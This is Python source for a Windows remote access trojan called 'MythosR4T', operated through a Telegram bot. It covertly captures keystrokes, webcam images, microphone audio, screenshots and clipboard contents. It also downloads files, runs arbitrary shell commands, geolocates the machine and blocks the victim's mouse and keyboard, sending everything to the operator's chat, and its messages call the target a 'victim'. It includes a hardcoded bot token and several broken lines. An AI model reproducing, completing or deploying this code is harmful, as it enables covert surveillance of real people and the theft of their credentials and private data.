# Author        : myth-dev
# GitHub        : https://github.com/mython-dev/
# Instagram     : @thehackerworld_ && @ myth.dev_
# Telegram      : @myth_dev
# Date          : 06.30.2023
# Main Language : Python
# Version RAT   : MythosR4T 1.0


import os
import psutil
import platform
import socket
import subprocess
import urllib.request
import ctypes
import getpass
import time
import requests
import pyaudio
import wave
from threading import Thread
import keyboard
import pyperclip
import pyautogui
from pynput.mouse import Controller
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from PIL import ImageGrab
import cv2
import win32com.client
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from libs.config import TOKEN, ID
from libs.logo import LOGO
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
import json
import webbrowser



bot = Bot(token=8313537892:AAGoLT_FwlCmSrrEI_Q9siww-uIozOSGckI)
dp = Dispatcher(5493202205)

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

USER_NAME = getpass.getuser()

#                               *************************************************
#                               #        COMMAND SHUTDOWN and REBOOT!!!         #
#                               ************************************************* 

async def reboot_command(message: types.Message):
        try:
            await bot.send_message(chat_id=ID, text='Перезагружаю пк...')
            os.system('shutdown /r /t 0')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=e)


async def shutdown_command(message: types.Message):
        try:
            await bot.send_message(chat_id=ID, text='Выключаю пк...')
            os.system('shutdown /s /t 0')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=e)

#                               *************************************************
#                               #               COMMAND DRIVER!!!               #
#                               ************************************************* 

async def driver_command(message: types.Message):
    wmi = win32com.client.GetObject("winmgmts:")
    drivers = wmi.ExecQuery("SELECT * FROM Win32_PnPSignedDriver")

    with open('drivers.txt', 'w', encoding='utf-8') as f:
        f.write(LOGO)
        for driver in drivers:
            f.write(f"Имя: {driver.DeviceName}\n"
                    f"Производитель: {driver.Manufacturer}\n"
                    f"Версия драйвера: {driver.DriverVersion}\n"
                    f"Дата драйвера: {driver.DriverDate}\n\n")

    with open('drivers.txt', 'rb') as f:
        await bot.send_document(ID, InputFile(f), caption='Ловите... Список драйверов')

    os.remove('drivers.txt')

#                               *************************************************
#                               #                  COMMAND KILL!!!              #
#                               ************************************************* 

async def kill_command(message: types.Message):
    
    if 5 == len(message.text):
        await bot.send_message(chat_id=ID, text='Отправте id, Пример: /kill 1234')
    else:
        try:
            process_id = int(message.text.split()[1])
            process = psutil.Process(process_id)
            process.terminate()
            await bot.send_message(chat_id=ID, text=f"Процесс {process_id} успешно остановлен.")
        except (IndexError, psutil.NoSuchProcess):
            await bot.send_message(chat_id=ID, text=f"Процесс {process_id} не найден.")
        except psutil.AccessDenied:
            await bot.send_message(chat_id=ID, text=f'Не получилось остановит процесс {process_id}, Ошибка: "psutil.AccessDenied" доступ к этому процессу запрещён.')

#                               *************************************************
#                               #               COMMAND SYS INFO!!!             #
#                               ************************************************* 

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


async def sysinfo_command(message: types.Message):
    cpu_usage = psutil.cpu_percent()
    mem_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    countofcpu = psutil.cpu_count(logical=True)
    uname = platform.uname()
    local_ip = None
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    svmem = psutil.virtual_memory()

    await bot.send_message(chat_id=ID, text=
            f"Имя пк: {str(uname.node)}\n"
            f"Юзер: {os.getlogin()}\n"
            f"Система: {platform.system()}\n"
            f"Архитиктура: {platform.machine()()}\n"
            f"Центральный процессор (CPU): {cpu_usage}% / 100.0%\n"
            f"Оперативная память (RAM): ГБ {str(get_size(svmem.total))}, {mem_usage}% / 100.0%\n"
            f"Общее количество ядер процессора: {str(countofcpu)}\n"
            f"Локальный IP: {local_ip}\n"
            f"Глобальный IP: {external_ip}")
            
    output = subprocess.check_output(f'systeminfo', encoding='oem')
    partitions = psutil.disk_partitions()
    with open('sysinfo.txt', 'w', encoding='utf-8') as f:
        f.write(LOGO)
        f.write(output)
        for partition in partitions:
            f.write("\nДиск: " + str(partition.device))
            f.write("\nИмя диска: " + str(partition.mountpoint))
            f.write("\nТип файловой системы: " + str(partition.fstype))
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            f.write("\nОбщая память: " + str(get_size(partition_usage.total)))
            f.write("\nИспользуется: " + str(get_size(partition_usage.used)))
            f.write("\nСвободно: " + str(get_size(partition_usage.free)))
                        
    with open('sysinfo.txt', 'rb') as f:
        await bot.send_document(ID, InputFile(f), caption='Ловите... Подробный список.')

    os.remove('sysinfo.txt')

#                               *************************************************
#                               #             COMMAND TASK LIST!!!              #
#                               ************************************************* 

@dp.message_handler(commands=['tasklist'])
async def tasklist_command(message: types.Message):
    await bot.send_chat_action(chat_id=message.chat.id, action=types.ChatActions.TYPING)
    output = subprocess.check_output(['tasklist']).decode('cp866')

    filename = 'tasklist.txt'
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(LOGO)
        f.write(output)  

    with open(filename, 'rb') as f:
        await bot.send_document(ID, InputFile(f), caption='Ловите...')
    os.remove(filename) 

#                               *************************************************
#                               #               COMMAND MONITORS!!!             #
#                               ************************************************* 

async def send_list_monitor(message: types.Message):
    mon_list = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
    await bot.send_message(chat_id=ID, text=mon_list.encode())

#                               *************************************************
#                               #            COMMAND TURN OFF MONITOR!!!        #
#                               ************************************************* 

async def turnoffmon_command(message: types.Message):
    try:
        user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        await bot.send_message(chat_id=ID, text='Успешно! выключил монитор у жертвы 😆😆)))')
    except Exception as e: 
        await bot.send_message(chat_id=ID, text=f'Не получилось выключить монитор у жерты...Ошибка: {e}') 

#                               *************************************************
#                               #            COMMAND TURN ON MONITOR!!!         #
#                               ************************************************* 

async def turnonmon_command(message: types.Message):
    try:
        user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
        await bot.send_message(chat_id=ID, text='Успешно! включил монитор у жертвы.')
    except Exception as e: 
        await bot.send_message(chat_id=ID, text=f'Не получилось включить монитор у жерты...\nОшибка: {e}')

#                               *************************************************
#                               #             COMMAND VOLUME UP!!!              #
#                               ************************************************* 

async def volumeup_command(message: types.Message):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        await bot.send_message(chat_id=ID, text="Громкость успешно увеличена до 100%")
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'Не получилось увеличить громкость до 100%\nОшибка: {e}')

#                               *************************************************
#                               #              COMMAND VOLUME DOWN!!!           #
#                               ************************************************* 

async def volumedown_command(message: types.Message):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
        await bot.send_message(chat_id=ID, text="Громкость успешно уменшилась до 0%")
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'Не получилось уменшить громкость до 0%\nОшибка: {e}')

#                               *************************************************
#                               #             COMMAND SEND MESSAGE!!!           #
#                               ************************************************* 

async def sendmessage_command(message: types.Message):
    if len(message.text) == 12:
        await bot.send_message(chat_id=ID, text='Вот пример работы: /sendmessage Сообщение')
    else:
        try:
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/sendmessage ', '')
            time.sleep(1)
            await bot.send_message(chat_id=ID, text='Я отправлю скриншот только после того, как ваша жертва прочтет ваше сообщение.')
            user32.MessageBoxW(0, text1, 'Важная информация!', 0x00000000 | 0x00000040)
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            await bot.send_message(chat_id=ID, text='Подаждите отправляю скрин.')
            await bot.send_photo(ID, InputFile(f))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')

#                               *************************************************
#                               #            COMMAND SET WALLPAPER!!!           #
#                               ************************************************* 

async def setwallpaper_command(message: types.Message):
    if len(message.text) == 13:
        await bot.send_message(chat_id=ID, text='Отправьте путь обою. Пример: /setwallpaper /home/user/oboy.png')
    else:
        try:
            path = message.text.split('/')[1]
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await bot.send_message(chat_id=ID, text='Успешно установил обой.')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Не получилось установить обой\nОшибка: {e}')

#                               *************************************************
#                               #              COMMAND OPEN lINK!!!             #
#                               ************************************************* 

async def open_link_command(message: types.Message):
    if len(message.text) == 10:
         await bot.send_message(chat_id=ID, text='Вот пример работы: /open_link https://google.com/')
    else:
        try:
            await bot.send_message(chat_id=ID, text='Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            webbrowser.open_new(message.text.split()[1])
            time.sleep(3)
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            await bot.send_photo(ID, InputFile(f))
            try:
                os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming' + '\\sreenshot.jpg')
            except Exception as e:
                    bot.send_message(message.chat.id, 'Скриншот сделать удалось, но не получилось удалить скриншот после отправки:(\nКод ошибки:\n' + str(e))
                    bot.send_message(message.chat.id, 'Успешно открыта ссылка! Вот скриншот')
        except Exception as e:
            bot.send_message(message.chat.id, 'Не удалось открыть ссылку, используй такой формат: /open_link https://ссылка\nКод ошибки:\n' + str(e))

#                               *************************************************
#                               #                  COMMAND PWD!!!               #
#                               ************************************************* 

async def pwd_command(message: types.Message):
    pwd = str(os.getcwd())
    await bot.send_message(chat_id=ID, text=f'Текущая директория: {pwd}')

#                               *************************************************
#                               #                  COMMAND CD!!!                #
#                               ************************************************* 

async def cd_command(message: types.Message):
    if message.text == 2:
        await bot.send_message(chat_id=ID, text='Вот пример работы: /cd /home/user/Desktop')
    else:
        try:
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/cd ', '')
            os.chdir(text1)
            await bot.send_message(chat_id=ID, text='Успешно теперь мы в директории: ' + str(os.getcwd()))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Не получилось перейти на директорию {text1}\nОшибка: {e}')

#                               *************************************************
#                               #                  COMMAND DIR!!!               #
#                               ************************************************* 

async def dir_command(message: types.Message):
    try:
        output = subprocess.check_output(["dir"], shell=True)
        output = output.decode(encoding='utf8', errors='ignore')
        await bot.send_message(chat_id=ID, text=f'{output}')
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'Не получилось выполнить команду\nОшибка: {e}')

#                               *************************************************
#                               #              COMMAND MAKEDIR!!!                #
#                               ************************************************* 

async def makedir_command(message: types.Message):
    if len(message.text) == 8:
        await bot.send_message(chat_id=ID, text=f'Вот пример работы: /makedir namedir')
    else:
        try:
            name_dir = message.text.split()[1]
            os.mkdir(name_dir)
            await bot.send_message(chat_id=ID, text=f'Успешно создал директорию: {name_dir}')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')

#                               *************************************************
#                               #              COMMAND RMDIR!!!                 #
#                               ************************************************* 

async def rmdir_command(message: types.Message):
    if len(message.text) == 6:
        await bot.send_message(chat_id=ID, text='Вот пример работы: /rmdir namedir')
    else:
        try:
            name_dir = message.text.split()[1]
            os.rmdir(name_dir)
            await bot.send_message(chat_id=ID, text=f'Успешно удалил директорию: {name_dir}')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')


#                               *************************************************
#                               #              COMMAND RMFILE!!!                #
#                               ************************************************* 

async def rmfile_command(message: types.Message):
    if len(message.text) == 7:
        await bot.send_message(chat_id=ID, text='Вот пример работы: /rmfile filename.txt')
    else:
        try:
            file_name = message.text()[1]
            os.remove(file_name)
            await bot.send_message(chat_id=ID, text=f'Успешно удалил файл: {file_name}')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')

#                               *************************************************
                                #              COMMAND SEARCHFILE!!!            #
#                               ************************************************* 

async def searchfile_command(message: types.Message):
    try:
        # получаем название файла из сообщения пользователя
        file_name = message.text.split()[1]
        # ищем файл в текущей директории и всех поддиректориях
        for root, dirs, files in os.walk('.'):
            if file_name in files:
                # отправляем файл пользователю
                with open(os.path.join(root, file_name), 'rb') as f:
                    await bot.send_document(ID, InputFile(f))
                    break
            else:
                await bot.send_message(chat_id=ID, text=f'Файл {file_name} не найден')
    except IndexError:
        await bot.send_message(chat_id=ID, text='Вы не указали название файла\nВот пример работы: /searchfile myth_dev.txt')

    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')

#                               *************************************************
#                               #              COMMAND SCREENSHOT!!!            #
#                               ************************************************* 

async def screenshot_command(message: types.Message):
    try:
        screen = ImageGrab.grab()
        screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
        f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
        await bot.send_photo(ID, InputFile(f))
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')
    try:
        os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\sreenshot.png')
    except:
        pass

#                               *************************************************
#                               #             COMMAND WEBCAM SNAP!!!            #
#                               ************************************************* 

async def webcam_snap_command(message: types.Message):
    try:
        await bot.send_message(chat_id=ID, text='Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
        cap = cv2.VideoCapture(0)
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite(os.getenv("APPDATA") + '\\4543t353454.png', frame)   
        cap.release()
        webcam = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png','rb')
        await bot.send_photo(ID, InputFile(webcam))
        try:
            os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png')
        except:
            pass
    except:  
        await bot.send_message(chat_id=ID, text='У жертвы нету веб камеры.')    

#                               *************************************************
#                               #                COMMAND SHELL!!!               #
#                               ************************************************* 

async def shell(message: types.Message):
    if 6 == len(message.text):
        await bot.send_message(chat_id=ID, text='Вот пример работы: /shell <command>\nРаботает с багом!!!')
    else:
        cmd = message.text.split(' ', 1)[1]
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
            await message.answer(result.stdout.decode('cp1251', errors='ignore').encode('utf-8', errors='ignore').decode('utf-8', errors='ignore'))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Ошибка при выполенине команды: {e}') 

#                               *************************************************
#                               #              COMMAND DOWNLOAD!!!              #
#                               ************************************************* 

async def download_file(message):
    if len(message.text) == 9:
        await bot.send_message(chat_id=ID, text=f'Вот пример работы: /download /path/to/file')
    else:
        try:
            await bot.send_message(chat_id=ID, text='Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/download ', '')
            f = open(text1, 'rb')

            await bot.send_document(ID, InputFile(f))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')

#                               *************************************************
#                               #              COMMAND GEOLOCATE!!!             #
#                               ************************************************* 

async def geolocate_command(message: types.Message):
    url = "http://ip-api.com/json/?fields=country,region,regionName,city,zip,lat,lon,timezone,query"
    request = requests.get(url)
    requestMap = json.loads(request.text)
    locationInfo = "IP address: {0}\nCity: {1}\nZip Code: {2}\nRegion: {3}\nCountry: {4}\nTimezone: {5}\nEst. Coordinates: {6}, {7}".format(requestMap["query"], requestMap["city"], str(requestMap["zip"]), requestMap["region"], requestMap["country"], requestMap["timezone"], str(requestMap["lat"]), str(requestMap["lon"]))
    await bot.send_message(chat_id=ID, text=f'{locationInfo}')

#                               *************************************************
#                               #              COMMAND AUDIO!!!                 #
#                               ************************************************* 

async def audio_command(message: types.Message):
    if len(message.text) == 6:
        await bot.send_message(chat_id=ID, text=f'Вот пример работы: /audio <secund zapiz audio>')
    
    else:

        try:
            secund = int(message.text.split()[1])
            duration = int(secund)
            duration *= 44

            audio = pyaudio.PyAudio()
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            frames = []

            await bot.send_message(chat_id=ID ,text='Запись идет....')

            for i in range(1, duration):
                data = stream.read(1024)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            audio.terminate()
            sound_file = wave.open('audio.wav', 'wb')
            sound_file.setnchannels(1)
            sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
            sound_file.setframerate(44100)
            sound_file.writeframes(b''.join(frames))
            sound_file.close()
            await bot.send_message(chat_id=ID, text='Отправляю запись!!!')
            await bot.send_document(ID, open('audio.wav', 'rb'))
            try:
                os.remove('audio.wav')
            except:
                pass
        except Exception as e:
            print(e)
            await bot.send_message(ID, text=f'Ошибка: {e}')

#                               *************************************************
#                               #       COMMAND DISABLE or ENABLE MOUSE!!!      #
#                               ************************************************* 


def disable_mouse():
    mouse = Controller()
    t_end = time.time() + 3600*24*11
    while time.time() < t_end and mousedbl == True:
        mouse.position = (0, 0)

async def disablemouse_command(message: types.Message):
    global mousedbl
    mousedbl = True
    Thread(target=disable_mouse, daemon=True).start()
    await bot.send_message(chat_id=ID, text="Мышка отключена. Можете включить с помощью команду /enablemouse")

async def enablemouse_command(message: types.Message):
    global mousedbl
    mousedbl = False
    await bot.send_message(chat_id=ID, text="Мышь включена.")

#                               *************************************************
#                               #     COMMAND DISABLE or ENABLE KEYBOARD!!!     #
#                               ************************************************* 

def disable_keyboard():
    if kbrd == True:
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
                
        time.sleep(999999)

    elif kbrd == False:
        print('test')

async def disablekeyboard_command(message: types.Message):
        global kbrd
        kbrd = True
        Thread(target=disable_keyboard, daemon=True).start()
        await bot.send_message(chat_id=ID, text="Клавиатура отключена, Можете включить с помощью команду /enablekeyboard")

async def enablekeyboard_command(message: types.Message):
    global kbrd
    kbrd = False
    await bot.send_message(chat_id=ID, text=f'Клавиатура включена.') 

#                               *************************************************
#                               #               COMMAND CLIPBOARD!!!            #
#                               ************************************************* 

async def clipboard_command(message: types.Message):
    Buffer = pyperclip.paste()
    await bot.send_message(chat_id=ID, text=f'Буфер обмена: {Buffer}')

#                               *************************************************
#                               #               COMMAND ALT + F4!!!             #
#                               ************************************************* 

async def f4(message: types.Message):
        try:
            msg = await bot.send_message(chat_id=ID, text='Щас закроем окно 🌚')
            pyautogui.hotkey('alt','f4')
            await bot.send_message(chat_id=ID, text='Окно было успешно закрыто ✅')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=e)


#                               *************************************************
#                               #               COMMAND RUNPROGRAMM!!!          #
#                               ************************************************* 

async def runprogramm_command(message: types.Message):
    if len(message.text) == 12:
        await bot.send_message(chat_id=ID, text='Вот пример работы /runprogramm notepad.exe')
    else:
        try:
            programm = message.text.split()[1]
            os.system(programm)
            time.sleep(1)
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_photo(ID, f, caption='Запустил)))')
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(ID, e)
                
        except Exception as e:
            print(e)
            await bot.send_message(ID, text=f'Ошибка: {e}')

#                               *************************************************
#                               #           COMMAND START KEYLOGGER!!!          #
#                               #           COMMAND STOP KEYLOGGER!!!!          #
#                               ************************************************* 


def keylogger():
    def on_press(key):
        if klgr == True:
            with open('keylogs.txt', 'a') as f:
                f.write(f'{key}')
                f.close()

    with Listener(on_press=on_press) as listener:
            listener.join()

async def start_keylogger(message: types.Message):
    global klgr
    klgr = True
    kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
    FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
    None, CREATE_ALWAYS , 0, 0)
    Thread(target=keylogger, daemon=True).start()
    await bot.send_message(chat_id=ID, text="Кейлоггер запущен")

async def stop_keylogger(message: types.Message):
    global klgr
    klgr = False
    await bot.send_message(chat_id=ID, text="Кейлоггер остановлен.")

async def send_logs(message: types.Message):
    await bot.send_document(ID, InputFile('keylogs.txt'))
    try:
        os.remove('keylogs.txt')
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f"Я не смог удалить файл 'keylogs.txt' на компьютере жертвы.\nОшибка: {e}")
